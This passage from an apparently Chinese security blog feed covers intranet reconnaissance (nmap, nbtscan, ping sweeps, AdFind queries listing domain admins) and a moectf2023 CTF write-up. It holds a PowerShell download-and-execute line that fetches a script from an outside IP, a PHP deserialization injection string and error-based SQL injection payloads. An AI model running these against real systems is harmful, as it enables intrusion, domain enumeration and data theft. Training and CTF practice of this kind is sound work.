class="hljs-keyword">domain</span><br></code></pre></td></tr></table></figure><p>除了以上的命令还可以使用端口识别的方式</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs tap">端口：<span class="hljs-number"> 53 </span>  DNS服务器开放<br>端口：<span class="hljs-number"> 389 </span> 轻型目录访问协议<br></code></pre></td></tr></table></figure><p>个人推荐</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ada">ipconfig /<span class="hljs-keyword">all</span> <br>setspn <br></code></pre></td></tr></table></figure><h2 id="内网存活探测"><a href="#内网存活探测" class="headerlink" title="内网存活探测"></a>内网存活探测</h2><p>windows  445端口  存活探测</p><p>linux 22 端口</p><p>最好扫描16 的子网掩码，因为有可能存在其他网段的情况</p><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sU -T4 --script nbstat.nse -p137 <span class="hljs-number">10.10.10.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure><blockquote><p>-sU:扫描udp端口</p><p>-T4:指定扫描的速度</p><p>–script:指的是指定脚本</p><p>-p137:指定的端口（文件共享端口）</p></blockquote><h3 id="msf扫描"><a href="#msf扫描" class="headerlink" title="msf扫描"></a>msf扫描</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109165748478.png" alt="image-20240109165748478"></p><p>由于kali 不和那些是一个网段，所以用不了，反映了显示状态下kali的局限性，替代方式是vps</p><h3 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h3><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109170056352.png" alt="image-20240109170056352"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20240109170225885.png" alt="image-20240109170225885"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">linux:</span>  nbtscan -r <span class="hljs-built_in">ip</span>段<br></code></pre></td></tr></table></figure><h3 id="icmp协议"><a href="#icmp协议" class="headerlink" title="icmp协议"></a>icmp协议</h3><p>nmap会使用ping 做存活探测</p><blockquote><p>  @for &#x2F;l %i in  (1,1,255) do @ping -n 1 -w  40 10.10.10.%i &amp; if errorlevel 1 (echo  10.10.10.%i&gt;&gt;c:\a.txt) else (e  cho 10.10.10.%i &gt;&gt;c:\b.txt)  </p></blockquote><h3 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h3><p>本质是icmp</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell.exe <span class="hljs-literal">-exec</span> bypass <span class="hljs-literal">-Command</span> <span class="hljs-string">&quot;Import-Module ./Invoke-TSPingSweep.ps1; Invoke-TSPingSweep -StartAddress</span><br><span class="hljs-string">192.168.1.1 -EndAddress 192.168.1.254 -ResolveHost -ScanPort -Port 445,135&quot;</span><br>powershell <span class="hljs-built_in">iex</span>(<span class="hljs-built_in">new-object</span> net.webclient).downloadstring(<span class="hljs-string">&#x27;http://47.104.255.11:8000/Invoke-TSPingSweep.ps1&#x27;</span>);<span class="hljs-keyword">In</span><br>voke<span class="hljs-literal">-TSPingSweep</span> <span class="hljs-literal">-StartAddress</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.1</span> <span class="hljs-literal">-EndAddress</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">10.254</span> <span class="hljs-literal">-ResolveHost</span> <span class="hljs-literal">-ScanPort</span> <span class="hljs-literal">-Port</span> <span class="hljs-number">445</span>,<span class="hljs-number">135</span><br><br></code></pre></td></tr></table></figure><h2 id="内网信息收集工具"><a href="#内网信息收集工具" class="headerlink" title="内网信息收集工具"></a>内网信息收集工具</h2><h3 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h3><ol><li><p>简介</p><p>内网综合扫描工具，方便一键自动化，全方位漏洞扫描器</p><blockquote><p>  项目地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a>  </p></blockquote></li><li><p>探测存活</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">fscan.exe -h 192.168.1.1/24 (默认使用全部模块)<br>fscan.exe -h 192.168.1.1/16 (B段扫描)<br></code></pre></td></tr></table></figure></li></ol><h3 id="LadonGo"><a href="#LadonGo" class="headerlink" title="LadonGo"></a>LadonGo</h3><p>LadonGO 4.2 Pentest Scanner framework 全平台Go开源内网渗透扫描器框架</p><p>但是这个需要自己编译一下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> build <br></code></pre></td></tr></table></figure><p>具体也可以参照github</p><h3 id="Adfind"><a href="#Adfind" class="headerlink" title="Adfind"></a>Adfind</h3><p>这个是在cs里面存在的</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs prolog"><span class="hljs-symbol">Usage</span>:<br> <span class="hljs-symbol">AdFind</span> [switches] [-b basedn] [-f filter] [attr list]<br><br>   basedn        <span class="hljs-symbol">RFC</span> <span class="hljs-number">2253</span> <span class="hljs-symbol">DN</span> to base search from. <span class="hljs-symbol">If</span> no base specified, defaults to default <span class="hljs-symbol">NC</span>.<br>                 <span class="hljs-symbol">Base</span> <span class="hljs-symbol">DN</span> can also be specified as a <span class="hljs-symbol">SID</span>, <span class="hljs-symbol">GUID</span>, or <span class="hljs-symbol">IID</span>.<br>   filter        <span class="hljs-symbol">RFC</span> <span class="hljs-number">2254</span> <span class="hljs-symbol">LDAP</span> filter. <span class="hljs-symbol">If</span> no filter specified, defaults to objectclass=*.<br>   attr list     <span class="hljs-symbol">List</span> of specific attributes to return, <br>                 if nothing specified returns <span class="hljs-string">&#x27;default&#x27;</span> attributes, aka * set.<br><br>  <span class="hljs-symbol">Switches</span>: (designated by - or /)<br><br>    [<span class="hljs-symbol">CONNECTION</span> <span class="hljs-symbol">OPTIONS</span>][连接选项]<br>   -h host:port  要使用的主机和端口。如果未指定，则使用默认<span class="hljs-symbol">LDAP</span>服务器上的端口<span class="hljs-number">389</span>。<br>                 <span class="hljs-symbol">Localhost</span>可以指定为“.”; 还可以通过-p和-gc指定端口。<br>                 指定了带端口的<span class="hljs-symbol">IPv6</span> [address]:port<br>   -gc           搜索全局目录 (port <span class="hljs-number">3268</span>)。<br>   -p port       指定要连接到的端口的备用方法。<br><br>    [<span class="hljs-symbol">QUERY</span> <span class="hljs-symbol">OPTIONS</span>][查询选项]<br>   -s scope      搜索范围。 <span class="hljs-symbol">Base</span>, <span class="hljs-symbol">One</span>[<span class="hljs-symbol">Level</span>], <span class="hljs-symbol">Sub</span>[tree].<br>   -t xxx        查询的超时值，默认为<span class="hljs-number">120</span>秒。<br><br>    [<span class="hljs-symbol">OUTPUT</span> <span class="hljs-symbol">OPTIONS</span>][输出选项]<br>   -c            仅对象计数。<br>   -dn           仅对象<span class="hljs-symbol">DN</span>。<br>   -appver       输出<span class="hljs-symbol">AdFind</span>版本信息。<br></code></pre></td></tr></table></figure><p>查看域控的名称</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">adfind -sc dclist</span><br></code></pre></td></tr></table></figure><p>查看域控的版本</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-comment">#列出域控制器名称</span><br>AdFind -<span class="hljs-keyword">sc </span>dclist<br><br><span class="hljs-comment">#查看域控版本</span><br>AdFind -<span class="hljs-keyword">schema </span>-s <span class="hljs-keyword">base </span>objectversion<br><br><span class="hljs-comment">#查询当前域中在线的计算机(所有属性)</span><br>AdFind -<span class="hljs-keyword">sc </span>computers_active<br><br><span class="hljs-comment">#查询当前域中在线的计算机(只显示名称和操作系统)</span><br>AdFind -<span class="hljs-keyword">sc </span>computers_active name operatingSystem<br><br><span class="hljs-comment">#查询当前域中所有计算机(所有属性)</span><br>AdFind -f <span class="hljs-string">&quot;objectcategory=computer&quot;</span><br><br><span class="hljs-comment">#查询当前域中所有计算机(只显示名称和操作系统)</span><br>AdFind -f <span class="hljs-string">&quot;objectcategory=computer&quot;</span> name operatingSystem<br><br><span class="hljs-comment">#查询指定域(mingy.local)中所有计算机(所有属性)</span><br>Adfind -<span class="hljs-keyword">b </span>dc=mingy,dc=local -f <span class="hljs-string">&quot;objectcategory=computer&quot;</span><br><br><span class="hljs-comment">#查询域内所有用户</span><br>AdFind -users name<br><br><span class="hljs-comment">#查询指定域(mingy.local)内所有用户(所有属性)</span><br>Adfind -<span class="hljs-keyword">b </span>dc=mingy,dc=local -f <span class="hljs-string">&quot;objectcategory=user&quot;</span><br><br><span class="hljs-comment">#查询所有GPO信息</span><br>AdFind -<span class="hljs-keyword">sc </span>gpodmp<br><br><span class="hljs-comment">#查看受保护AD域账户</span><br>Adfind -f <span class="hljs-string">&quot;&amp;(objectcategory=person)(samaccountname=*)(admincount=1)&quot;</span> -dn<br><br><span class="hljs-comment">#查看域管账户</span><br>AdFind -default -f <span class="hljs-string">&quot;(&amp;(|(&amp;(objectCategory=person)(objectClass=user))(objectCategory=group))(adminCount=1))&quot;</span> -dn<br></code></pre></td></tr></table></figure><h2 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h2><p>大型域常用的工具</p><p>直接在kali 上面运行就行了</p>]]></content>
    
    
    
    <tags>
      
      <tag>渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>moectf2023</title>
    <link href="/2023/09/10/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/moectf2023/"/>
    <url>/2023/09/10/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/moectf2023/</url>
    
    <content type="html"><![CDATA[<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910233257705.png" alt="image-20230910233257705"></p><p>就是按照步骤完成就行了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910233715138.png" alt="image-20230910233715138"></p><p>0x01</p><p>将请求类型转变成POST</p><p>然后通过get 的方式使用post传参</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910233817746.png" alt="image-20230910233817746"></p><p>0x02</p><p>使用post的方式传参</p><p>0x03</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910233902951.png" alt="image-20230910233902951"></p><p>将character修改成admin</p><p>0x04</p><p>添加下面这一行</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910234020326.png" alt="image-20230910234020326"></p><p>0x05</p><p>修改字段为</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910234048061.png" alt="image-20230910234048061"></p><h2 id="WEB入门指北"><a href="#WEB入门指北" class="headerlink" title="WEB入门指北"></a>WEB入门指北</h2><p>打开文件之后发现，在最下面发现</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910234420076.png" alt="image-20230910234420076"></p><p>这个是16进制加密，解密就好</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230910234453286.png" alt="image-20230910234453286"></p><h2 id="彼岸的flag"><a href="#彼岸的flag" class="headerlink" title="彼岸的flag"></a>彼岸的flag</h2><p>0x01</p><p>简单抓包，然后在发送的数据包中所有moectf就可以找到</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911092017819.png" alt="image-20230911092017819"></p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>0x01</p><p>伪造一个用户登录</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911092334905.png" alt="image-20230911092334905"></p><p>0x02</p><p>登录就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911092450153.png" alt="image-20230911092450153"></p><p>记录这个时候的token，使用base64解密如下</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911093159059.png" alt="image-20230911093159059"></p><p>将角色改成admin，再经行加密</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911093233173.png" alt="image-20230911093233173"></p><p>0x03</p><p>构造发送包，使用get，获取flag</p><p>注意划横线的地方</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911093410726.png" alt="image-20230911093410726"></p><h2 id="gas-gas-gas"><a href="#gas-gas-gas" class="headerlink" title="gas!gas!gas!"></a>gas!gas!gas!</h2><p>0x01</p><p>看这个题目的意思，我们就是需要，在0.5秒，更具提示发送5个包</p><p>我们使用python实现</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br><br><br>url = <span class="hljs-string">&#x27;http://127.0.0.1:56182&#x27;</span><br>control=<span class="hljs-number">0</span><br>throttle=<span class="hljs-number">2</span><br>data1 = &#123;<span class="hljs-string">&#x27;driver&#x27;</span>:<span class="hljs-string">&#x27;august&#x27;</span>,<span class="hljs-string">&#x27;steering_control&#x27;</span>: control, <span class="hljs-string">&#x27;throttle&#x27;</span>: throttle&#125;<br><br>pattern = <span class="hljs-string">r&#x27;弯道(.*?)，(.*?)&lt;/font&gt;&#x27;</span><br><br><span class="hljs-keyword">with</span> requests.Session() <span class="hljs-keyword">as</span> session:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):  <span class="hljs-comment"># 不知道为什么6次不行</span><br>        response = session.post(url, data=data1)<br>        <span class="hljs-built_in">print</span>(response.text)<br>        <span class="hljs-keyword">match</span> = re.search(pattern, response.text)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>) == <span class="hljs-string">&quot;向左&quot;</span>:<br>                control=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)==<span class="hljs-string">&quot;向右&quot;</span>:<br>                control=-<span class="hljs-number">1</span><br>            <span class="hljs-keyword">else</span>:<br>                control=<span class="hljs-number">0</span><br>            <br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)==<span class="hljs-string">&quot;抓地力太小了！&quot;</span>:<br>                throttle=<span class="hljs-number">0</span><br>            <span class="hljs-keyword">elif</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">2</span>)==<span class="hljs-string">&quot;抓地力太大了！&quot;</span>:<br>                throttle=<span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                throttle=<span class="hljs-number">1</span>    <br>            data1 = &#123;<span class="hljs-string">&#x27;driver&#x27;</span>:<span class="hljs-string">&#x27;august&#x27;</span>,<span class="hljs-string">&#x27;steering_control&#x27;</span>: control, <span class="hljs-string">&#x27;throttle&#x27;</span>: throttle&#125;<br>            <span class="hljs-comment"># print(f&quot;output:&#123;match.group(1)&#125;,&#123;match.group(2)&#125;\n&#123;control&#125;,&#123;throttle&#125;&quot;)</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>)<br>            <span class="hljs-keyword">break</span>    <br><br><span class="hljs-comment"># response = session.post(url, data=data1)</span><br><span class="hljs-comment"># print(response.text)</span><br><br></code></pre></td></tr></table></figure><p>然后注意看打印 的信息就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911094415511.png" alt="image-20230911094415511"></p><h2 id="moe图床"><a href="#moe图床" class="headerlink" title="moe图床"></a>moe图床</h2><p>简单的上传漏洞</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911094723479.png" alt="image-20230911094723479"></p><p>0x01</p><p>我们先试一下，上传php</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911094754612.png" alt="image-20230911094754612"></p><p>并不行，这道题的基本思路就是上传php，通过蚁剑等工具连接</p><p>既然php后缀不行，我首先想到的是，后缀绕过法</p><p>0x02</p><p>直到使用下面这个格式可以</p><h2 id="大海捞针"><a href="#大海捞针" class="headerlink" title="大海捞针"></a>大海捞针</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911104057204.png" alt="image-20230911104057204"></p><p>就直接爆破就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911104429696.png" alt="image-20230911104429696"></p><p>然后分析出最特殊的哪一个，然后经行搜索</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911104752570.png" alt="image-20230911104752570"></p><h2 id="meo图床"><a href="#meo图床" class="headerlink" title="meo图床"></a>meo图床</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920000027358.png" alt="image-20230920000027358"></p><p>0x01</p><p>尝试上传图片</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920000553743.png" alt="image-20230920000553743"></p><p>上传成功</p><p>尝试抓包，看什么情况</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920001213659.png" alt="image-20230920001213659"></p><h2 id="夺命十三枪"><a href="#夺命十三枪" class="headerlink" title="夺命十三枪"></a>夺命十三枪</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920001247132.png" alt="image-20230920001247132"></p><p>0x01</p><p>我们可以直接访问到</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920001318716.png" alt="image-20230920001318716"></p><p>访问看看什么情况</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920001409398.png" alt="image-20230920001409398"></p><p>这样的，我们可以分析得到，只要将Spear_Owner&#x3D;MaoLei就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920001459028.png" alt="image-20230920001459028"></p><p>然后怎么构造呢？</p><p>0x02</p><p>这个函数会缩短和变长，所以我们尝试使用他构造我们的参数</p><p>原理如下：</p><p>序列化的长度是不会变的，但是我们的函数会改变他的长度，所以如果我们将我们的参数前面边长，当和序列化的长度一致的时候，如果又“};”就会被截断，达到我们传参的目的</p><p>因为我们需要将这段换成我们需要的MaoLei，我们只能通过传参的方式将我们的想法传进去，所以这个时候，尝试让前面变长</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920004305889.png" alt="image-20230920004305889"></p><p>利用上面的长度，重新构造成新的</p><blockquote><p>di_jiu_qiangdi_shi_san_qiangdi_shi_san_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang”;s:11:”Spear_Owner”;s:6:”MaoLei”;}</p></blockquote><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230920005005478.png" alt="image-20230920005005478"></p><h2 id="出去旅游的新海"><a href="#出去旅游的新海" class="headerlink" title="出去旅游的新海"></a>出去旅游的新海</h2><p>0x01</p><p>首先对这个分析，直接F12</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20230921204239086.png" alt="image-20230921204239086"></p><p>看到一个php，点开它</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/image-20230921204334075.png" alt="image-20230921204334075"></p><p>可以看到一个这个函数，可以知道他是显错注入</p><p>0x02</p><p>通过updatexml函数查询，具体的数据</p><p>0x03</p><p>查询当前数据库的所有的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ip=1&amp;user_agent=1&amp;time=1 and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)<br></code></pre></td></tr></table></figure><p>0x04</p><p>查询secret_of_kokomi表的字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">ip=1&amp;user_agent=1&amp;time=1 and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name= &#x27;secret_of_kokomi&#x27;),0x7e),1)<br></code></pre></td></tr></table></figure><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230921205724283.png" alt="image-20230921205724283"></p><p>0x05</p><p>开始爆破数据</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230921210653591.png" alt="image-20230921210653591"></p><blockquote><p>ip&#x3D;1&amp;user_agent&#x3D;1&amp;time&#x3D;1 and updatexml(1,substring(concat(0x7e,(select group_concat(content,0x7e,id) from secret_of_kokomi)),30,40),1)</p></blockquote><p>完整的flag是</p><blockquote><p>moectf{Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!}</p></blockquote><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Reverse入门指北"><a href="#Reverse入门指北" class="headerlink" title="Reverse入门指北"></a>Reverse入门指北</h2><p>0x01</p><p>将exe文件放入ida然后查看string 即可</p><h2 id="base-64"><a href="#base-64" class="headerlink" title="base_64"></a>base_64</h2><p>0x01</p><p>解压文件发现是一个.pyc 文件，所以我们放入反编译的网站</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911105228213.png" alt="image-20230911105228213"></p><p>0x02</p><p>可以得出，使用str1，换一个string2码表</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911110209718.png" alt="image-20230911110209718"></p><h2 id="Xor"><a href="#Xor" class="headerlink" title="Xor"></a>Xor</h2><p>0x01 </p><p>放入ida之后发现，分析就是一个简单的异或加密</p><p>0x02</p><p>将enc异或就好了</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911111155805.png" alt="image-20230911111155805"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911111207923.png" alt="image-20230911111207923"></p><p>0x03</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911111320211.png" alt="image-20230911111320211"></p><h2 id="UPX"><a href="#UPX" class="headerlink" title="UPX!"></a>UPX!</h2><p>忘记了可以先看这个</p><p><a href="https://blog.csdn.net/weixin_39190897/article/details/115592095">CTF逆向-Upx脱壳攻防世界simple unpack_ctf upx逆向_Tr0e的博客-CSDN博客</a></p><p>0x01</p><p>所以我们就可以先放入wsl-kali里进行脱壳，然后，再放入ida里面</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/moectf/image-20230911111955537.png" alt="image-20230911111955537"></p><p>0x02</p><p>我们通过string找到主要的函数</p><p><img 